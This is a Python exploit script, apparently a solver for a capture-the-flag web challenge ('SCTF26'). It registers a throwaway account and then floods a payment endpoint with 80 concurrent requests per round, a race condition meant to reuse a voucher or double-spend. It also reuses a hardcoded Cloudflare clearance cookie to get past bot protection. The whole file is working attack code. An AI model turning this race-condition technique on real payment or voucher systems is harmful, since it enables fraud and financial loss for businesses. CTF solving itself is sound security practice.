import requests, random, string, re, time
from concurrent.futures import ThreadPoolExecutor, as_completed
BASE = "https://tax.sctf.my.id"
CF_CLEARANCE = "UaYBSKZFW7zxg3YcrU9X94Ht0.i2AIPCoep8a4R1hcM-1783098909-1.2.1.1-D3lYZ_E3SKcSh83tw8sy7BHWKgeoCeWZ.5bv8z6tS3upqMtqiedXWlYPuSR.953ZPWQA67I.lauDjx_LQ2Z1nGXKX41Hyrjcrom2hIKHyeODnxDs7eitmUmcRY_MHqxpG_hQw0itsVhNQ2JyFI6FZyUDYe1g5rZohIEp2aMVNkgAJYETp27Iosvz5dHyb0qZJpqQ9UvXxIaxT_Te8kw40CkMmMlC_bjfSrQ4JJO8D76MW3oDjSziInqvEGb2r1T1HqsqsaGvjuuzLUEOQlWc05VJ4yjD5VY59kJRFpdBz2HInMJdj06VET2j6N6woazqEMa1X3FgKO1Nb9LxPa5DGauU306pn7rX9Mu1i6PQKkl6NL.mJc9iaCRiAjNxJbX02vyYoiOUWgvVNTROkCrhF4DNMQLZNCHfeI6I6qyxhuROwgbwobWJQA8xJ6rdkW1n"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
def mk_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    })
    s.cookies.set("cf_clearance", CF_CLEARANCE, domain="tax.sctf.my.id", path="/")
    return s
def find_flag(text):
    m = re.search(r"SCTF26\{[^}]+\}", text)
    return m.group(0) if m else None
username = "ridwan_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
password = "P@ssw0rd123"
s = mk_session()
print("[+] register:", username)
r = s.post(BASE + "/api/register", json={"username": username, "password": password}, timeout=10)
print(r.status_code, r.text[:300])
print("[+] login")
r = s.post(BASE + "/api/login", json={"username": username, "password": password}, timeout=10)
print(r.status_code, r.text[:300])
print("[+] cookies:", s.cookies.get_dict())
r = s.get(BASE + "/api/user", timeout=10)
print("[+] user:", r.status_code, r.text)
user = r.json()
bill = int(user.get("bill", 0))
BODY = {"amount": bill, "useVoucher": True}
def pay(i):
    try:
        x = mk_session()
        # copy session login connect.sid
        for c in s.cookies:
            x.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
        rr = x.post(BASE + "/api/pay", json=BODY, timeout=15)
        return i, rr.status_code, rr.text
    except Exception as e:
        return i, "ERR", str(e)
print("[+] racing /api/pay ...")
for round_id in range(1, 8):
    print(f"\n=== ROUND {round_id} ===")
    with ThreadPoolExecutor(max_workers=80) as ex:
        futs = [ex.submit(pay, i) for i in range(80)]
        for fut in as_completed(futs):
            i, code, text = fut.result()
            short = text[:220].replace("\n", " ")
            print(f"[{i}] {code} {short}")
            flag = find_flag(text)
            if flag:
                print("\nFOUND FLAG:", flag)
                raise SystemExit
    r = s.get(BASE + "/api/user", timeout=10)
    print("[+] user after:", r.status_code, r.text)
    flag = find_flag(r.text)
    if flag:
        print("\nFOUND FLAG:", flag)
        raise SystemExit
    time.sleep(0.5)
print("\n[-] belum dapet flag, coba jalanin lagi.")